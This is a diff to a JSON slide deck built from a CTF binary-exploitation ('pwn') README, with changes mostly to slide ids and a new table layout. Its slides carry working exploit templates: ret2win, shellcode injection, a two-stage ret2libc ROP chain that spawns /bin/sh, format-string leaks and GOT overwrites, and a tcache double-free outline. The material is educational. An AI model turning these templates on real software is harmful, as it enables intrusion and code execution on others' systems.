@@ -4,7 +4,7 @@
   "source": "pwn/README.md",
   "slides": [
     {
-      "id": "52a482fc-c80b-4fa0-bbcf-0f718a46081e",
+      "id": "954e70ba-34e2-4b2a-9716-5ab852f03d8a",
       "layout": "center",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -19,6 +19,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -26,6 +30,7 @@
       "showSubtitle": true,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "center",
@@ -33,7 +38,7 @@
       "transition": "zoom"
     },
     {
-      "id": "fed6cde2-419f-47f9-b8ff-4c942ba682e7",
+      "id": "88cf213f-c6ad-481c-a013-c7ae32346ba0",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -52,6 +57,10 @@
         "Know how the stack works",
         "Can use GDB"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -59,6 +68,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -66,7 +76,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "f14e3704-13bf-4550-96dd-eb4d62f767c1",
+      "id": "653aadcb-758b-4f51-b51e-fff27b8d59c9",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -81,6 +91,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Check protections\nchecksec --file=binary\n\n# Key protections:\n# RELRO     - protects GOT from overwrites (Partial < Full)\n# Stack Canary - stack cookie before return address\n# NX / DEP  - non-executable stack (no shellcode on stack)\n# PIE       - Position Independent Executable (randomized base)\n# ASLR      - Address Space Layout Randomization (OS-level)\n\n# Identify architecture and file type\nfile binary\n\n# Find interesting strings\nstrings binary | grep -i flag\nstrings binary | grep -i pass\n\n# Check linked libraries\nldd binary\n\n# Disassemble main\nobjdump -d binary | grep -A 40 \"<main>:\"",
       "codeLang": "bash",
       "imageUrl": "",
@@ -88,6 +102,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -95,7 +110,7 @@
       "transition": "fade"
     },
     {
-      "id": "649d2cf5-c1b0-4f8a-94aa-4fcd2b97bc95",
+      "id": "544bd62d-7d36-441a-b827-fbdbc82b333b",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -110,6 +125,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Start\ngdb ./binary\ngdb -q ./binary          # quiet mode\n\n# pwndbg key commands\nstart                    # run and stop at main\nrun < input.txt          # run with input\nbreak *0x401234          # breakpoint at address\nbreak main               # breakpoint at function\ncontinue                 # continue execution\nnext / ni                # next instruction (step over)\nstep / si                # step into\nfinish                   # run until end of function\n\ninfo registers           # show all registers\nx/10gx $rsp              # examine 10 64-bit words at RSP\nx/s 0x402000             # examine string at address\nstack 20                 # show 20 stack entries (pwndbg)\nvmmap                    # memory map (pwndbg)\ngot                      # GOT table (pwndbg)",
       "codeLang": "bash",
       "imageUrl": "",
@@ -117,6 +136,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -124,7 +144,7 @@
       "transition": "fade"
     },
     {
-      "id": "d39c5548-07f0-4171-a966-6dc85d02ea4c",
+      "id": "f82cc687-649a-4a9e-95a1-a2128aae8348",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -139,6 +159,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -146,6 +170,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -153,7 +178,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "eecd9172-0a41-4f77-ac6f-78f158bd8193",
+      "id": "850768a7-79f6-4d2b-a883-1ad16e1520a8",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -168,6 +193,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Generate cyclic pattern\nfrom pwn import *\nprint(cyclic(200))\n\n# After crash, find offset\ncyclic_find(0x61616175)   # value from $rip/$rbp after crash",
       "codeLang": "python",
       "imageUrl": "",
@@ -175,6 +204,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -182,7 +212,7 @@
       "transition": "fade"
     },
     {
-      "id": "44881b16-5592-45c7-a4a6-d167464bebf5",
+      "id": "8f81851b-4289-4866-a1cd-9beeeb84fabe",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -197,6 +227,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "from pwn import *\n\np = process('./binary')\nwin = p64(0x401234)   # address of win() function\n\npayload = b'A' * offset     # fill buffer + saved rbp\npayload += win\n\np.sendline(payload)\np.interactive()",
       "codeLang": "python",
       "imageUrl": "",
@@ -204,6 +238,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -211,7 +246,7 @@
       "transition": "fade"
     },
     {
-      "id": "752139b6-fb5f-4726-af25-77bc2e12d504",
+      "id": "43e62fb4-94ae-4a0e-ae5d-4b1f5d4cd804",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -226,6 +261,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "from pwn import *\n\np = process('./binary')\ncontext.arch = 'amd64'\n\nshellcode = asm(shellcraft.sh())\nbuf_addr = 0x...  # leak or known address of buffer\n\npayload = shellcode.ljust(offset, b'\\x90')\npayload += p64(buf_addr)\n\np.sendline(payload)\np.interactive()",
       "codeLang": "python",
       "imageUrl": "",
@@ -233,6 +272,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -240,7 +280,7 @@
       "transition": "fade"
     },
     {
-      "id": "f16cdfda-9afc-4b39-85eb-4a5a324d3fd7",
+      "id": "2a09eb27-78b9-475b-95a7-0441579b18fd",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -255,6 +295,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Find gadgets\nROPgadget --binary binary\nROPgadget --binary binary --rop\n\n# Useful gadgets\n# pop rdi ; ret     → set first argument\n# pop rsi ; ret     → set second argument\n# pop rdx ; ret     → set third argument\n# ret               → stack alignment (needed for movaps in libc)",
       "codeLang": "bash",
       "imageUrl": "",
@@ -262,6 +306,7 @@
       "showSubtitle": false,
       "showBody": true,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -269,7 +314,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "b1dd9c17-750d-42f7-9854-358952d059b3",
+      "id": "6ed1bad0-c3fb-46b8-92fe-7ed94634d428",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -284,6 +329,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "from pwn import *\n\nelf = ELF('./binary')\nlibc = ELF('./libc.so.6')\np = process('./binary')\n\n# --- Stage 1: Leak libc address ---\npop_rdi = 0x...         # pop rdi ; ret gadget\nret     = 0x...         # ret gadget (stack alignment)\nputs_plt = elf.plt['puts']\nputs_got = elf.got['puts']\nmain    = elf.sym['main']\n\npayload  = b'A' * offset\npayload += p64(pop_rdi)\npayload += p64(puts_got)\npayload += p64(puts_plt)\npayload += p64(main)     # return to main for stage 2\n\np.sendline(payload)\np.recvline()             # absorb any output before leak\n\nleak = u64(p.recvline().strip().ljust(8, b'\\x00'))\nlibc.address = leak - libc.sym['puts']\nlog.info(f\"libc base: {hex(libc.address)}\")\n\n# --- Stage 2: Call system(\"/bin/sh\") ---\nsystem   = libc.sym['system']\nbin_sh   = next(libc.search(b'/bin/sh'))\n\npayload2  = b'A' * offset\npayload2 += p64(ret)      # alignment\npayload2 += p64(pop_rdi)\npayload2 += p64(bin_sh)\npayload2 += p64(system)\n\np.sendline(payload2)\np.interactive()",
       "codeLang": "python",
       "imageUrl": "",
@@ -291,6 +340,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -298,7 +348,7 @@
       "transition": "fade"
     },
     {
-      "id": "220f9c2a-0083-4764-9d6c-ee249626f234",
+      "id": "fd820618-3b8a-41fb-ba64-06cd5e0a5423",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -313,6 +363,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "printf(user_input);   // vulnerable\nprintf(\"%s\", user_input);  // safe",
       "codeLang": "c",
       "imageUrl": "",
@@ -320,6 +374,7 @@
       "showSubtitle": false,
       "showBody": true,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -327,7 +382,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "acb46610-5792-4abb-823c-bfe28d69fb7a",
+      "id": "9bd7de2c-d8bf-4ab3-ae15-1485d4e38e54",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -342,6 +397,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Send %p.%p.%p... to read values off the stack\npayload = b'%p.' * 20\n\n# Find which argument holds your buffer (direct parameter access)\npayload = b'AAAA%1$p%2$p%3$p...'\n# When you see 0x41414141, that's your buffer position",
       "codeLang": "python",
       "imageUrl": "",
@@ -349,6 +408,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -356,7 +416,7 @@
       "transition": "fade"
     },
     {
-      "id": "f7d504db-2b56-4d48-b3e7-a20f848465e8",
+      "id": "edb12500-c9f5-4dd3-a0e7-6387bb6d44fc",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -371,6 +431,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "from pwn import *\n\n# Write address of win() to GOT entry of exit()\ntarget_addr = elf.got['exit']\nwin_addr    = elf.sym['win']\n\n# Use fmtstr_payload helper\npayload = fmtstr_payload(offset, {target_addr: win_addr})",
       "codeLang": "python",
       "imageUrl": "",
@@ -378,6 +442,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -385,7 +450,7 @@
       "transition": "fade"
     },
     {
-      "id": "8c72912c-2b9e-4172-abca-a860d8e9d4db",
+      "id": "c39b033c-ca10-49ee-9c5f-d2f47fa05ea9",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -400,6 +465,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -407,6 +476,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -414,7 +484,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "0e5bad34-c6b7-459b-9751-fc8aaacf37e2",
+      "id": "34ec0b92-0924-4443-a64b-5406f75ab0c7",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -435,6 +505,10 @@
         "Double free — free the same chunk twice",
         "Heap overflow — overflow into adjacent chunk metadata"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -442,6 +516,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -449,7 +524,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "f96cc2c0-75e7-4de9-beb5-748717286b21",
+      "id": "40355b8c-2c56-47bb-8bf6-d8a5f330cc0a",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -464,6 +539,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "# Double free in tcache (pre-2.32 no checks)\n# 1. malloc(0x20) → chunk_A\n# 2. free(chunk_A)\n# 3. free(chunk_A) again → chunk_A now in tcache twice\n# 4. malloc(0x20) → get chunk_A back, write fake fd pointer\n# 5. malloc(0x20) → get chunk_A again\n# 6. malloc(0x20) → allocate at fake_fd (arbitrary address)",
       "codeLang": "python",
       "imageUrl": "",
@@ -471,6 +550,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -478,7 +558,7 @@
       "transition": "fade"
     },
     {
-      "id": "4d80b2ed-312e-4866-8d0a-b8a68819d769",
+      "id": "1a0d6b15-06ad-4c7d-bced-77a89059be2a",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -493,6 +573,10 @@
       "bodyColor": "#7ab87a",
       "bodySize": 22,
       "bullets": [],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "from pwn import *\n\n# Context\ncontext.arch    = 'amd64'  # or 'i386', 'arm'\ncontext.os      = 'linux'\ncontext.log_level = 'debug'  # show all I/O\n\n# Connect\np = process('./binary')\np = remote('ctf.example.com', 1337)\n\n# Sending / Receiving\np.sendline(b'hello')\np.send(b'hello\\n')\np.recvline()\np.recvuntil(b'> ')\np.recvall()\np.interactive()\n\n# Packing integers\np64(0xdeadbeef)   # 64-bit little-endian\np32(0xdeadbeef)   # 32-bit little-endian\nu64(data[:8])     # unpack 64-bit\n\n# ELF helpers\nelf = ELF('./binary')\nelf.sym['main']         # symbol address\nelf.plt['puts']         # PLT entry\nelf.got['puts']         # GOT entry\n\n# Cyclic pattern\ncyclic(200)\ncyclic_find(0x61616175)",
       "codeLang": "python",
       "imageUrl": "",
@@ -500,6 +584,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": false,
+      "showTable": false,
       "showCode": true,
       "showImage": false,
       "textAlign": "left",
@@ -507,7 +592,7 @@
       "transition": "fade"
     },
     {
-      "id": "00acb558-9c00-48be-aeb3-7be1db65aa24",
+      "id": "69eb39fe-d45a-4c05-998f-408ff59f357e",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -521,20 +606,39 @@
       "bodyText": "",
       "bodyColor": "#7ab87a",
       "bodySize": 22,
-      "bullets": [
-        "Mitigation  ::  Bypass",
-        "NX  ::  ROP / ret2libc",
-        "Stack Canary  ::  Leak canary via format string or info leak",
-        "ASLR + PIE  ::  Leak runtime address, compute base",
-        "Full RELRO  ::  Can't overwrite GOT; use other write primitives"
-      ],
+      "bullets": [],
+      "tableData": {
+        "headers": [
+          "Mitigation",
+          "Bypass"
+        ],
+        "rows": [
+          [
+            "NX",
+            "ROP / ret2libc"
+          ],
+          [
+            "Stack Canary",
+            "Leak canary via format string or info leak"
+          ],
+          [
+            "ASLR + PIE",
+            "Leak runtime address, compute base"
+          ],
+          [
+            "Full RELRO",
+            "Can't overwrite GOT; use other write primitives"
+          ]
+        ]
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
       "showTitle": true,
       "showSubtitle": false,
       "showBody": false,
-      "showBullets": true,
+      "showBullets": false,
+      "showTable": true,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
@@ -542,7 +646,7 @@
       "transition": "slide-r"
     },
     {
-      "id": "3053f14b-1b98-4830-a20e-ea987cd93b28",
+      "id": "b25700a9-97c3-4889-8ad3-36680c6d6d97",
       "layout": "top",
       "bgType": "gradient",
       "bgColor": "#080b08",
@@ -564,6 +668,10 @@
         "ir0nstone's GitBook — modern PWN notes",
         "LiveOverflow YouTube — binary exploitation video series"
       ],
+      "tableData": {
+        "headers": [],
+        "rows": []
+      },
       "codeText": "",
       "codeLang": "",
       "imageUrl": "",
@@ -571,6 +679,7 @@
       "showSubtitle": false,
       "showBody": false,
       "showBullets": true,
+      "showTable": false,
       "showCode": false,
       "showImage": false,
       "textAlign": "left",
